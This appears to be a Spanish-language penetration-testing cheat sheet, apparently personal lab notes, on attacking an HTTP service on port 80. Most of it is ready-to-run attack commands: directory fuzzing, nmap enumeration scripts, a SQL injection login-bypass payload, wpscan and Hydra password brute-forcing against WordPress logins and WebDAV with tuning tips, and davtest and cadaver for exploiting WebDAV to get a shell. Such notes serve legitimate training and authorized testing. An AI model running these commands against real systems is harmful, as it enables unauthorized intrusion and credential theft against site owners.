# HTTP (80)

Propietario: Adrian Gisbert Cabello

Cuando tengamos el puerto 80 abierto, lo primero es hacer un fuzzing para descubrir directorios:		***dirb [http://192.168.X.X*/](http://192.168.x.x/)**

Podemos usar scripts de nmap para enumerar la página HTTP:

- `nmap 192.168.X.X -sV -p 80 --script http-enum`
- `nmap 192.168.X.X -sV -p 80 --script http-headers`
- `nmap 192.168.X.X -sV -p 80 --script http-methods --script-args http-methods.url-path#/webdav/`

Podemos entrar en el ***X.X.X.X/phpinfo.php*** para saber versiones de la página web si lo tiene.

En los logins podemos usar una inyección sql: `' OR 1=1;-- -`

Comando para ver información del servidor web: `whatweb [http://192.168.X.X](http://192.168.x.x/)` | [`http://192.168.X.X/wordpress/`](http://192.168.x.x/wordpress/)

Comando para páginas wordpress: `wpscan --url [http://192.168.X.X/wordpress/](http://192.168.x.x/wordpress/)`

- `wpscan --url [http://192.168.X.X/wordpress/](http://192.168.x.x/wordpress/) --passwords /usr/share/wordlists/rockyou.txt`

Comando para fuerza bruta con hydra en wordpress: `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  192.168.X.X http-post-form 'wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'` (si no carga, en la P poner las contraseñas y en la L los usuarios)

- Si no nos funciona el comando anterior cambiar el parámetro `'wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'` → `'wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'` o el mensaje de error que nos de cuando ponemos mal las credenciales en la página de login del wordpress.
- Si tenemos el usuario ponemos ***-l nombreusuario*** si no tenemos el usuario ponemos ***-L /directorio/del/diccionario.txt*** Lo mismo pasa con ***-p*** y ***-P***
- Los http-post-form usados en hydra para hacer fuerza bruta a logins en páginas web tienen la siguiente sintaxis:
    - `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  192.168.X.X http-post-form 'URL:LOGIN_CAPTURADO_EN_BURPSUITE:MENSAJE_DE_ERROR' -t 64 -F`
    - `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  192.168.X.X http-post-form 'wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' -t 64 -F`
    - Los parámetros ***-t 64*** son los hilos que va a correr y ***-F*** es para que cuando encuentre una combinación válida, se detenga el ataque de fuerza bruta.
- Para hacer un ataque de fuerza bruta con hydra a una /webdav: `hydra -l /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.X.X http-get /webdav/`

Herramienta para explotar /webdav: `davtest -url [http://X.X.X.X/webdav/](http://x.x.x.x/webdav/)`

- `davtest -auth admin:123123 -url [http://X.X.X.X/webdav/](http://x.x.x.x/webdav/)`
- Para obtener una shell en la webdav: `cadaver [http://X.X.X.X/webdav](http://x.x.x.x/webdav)`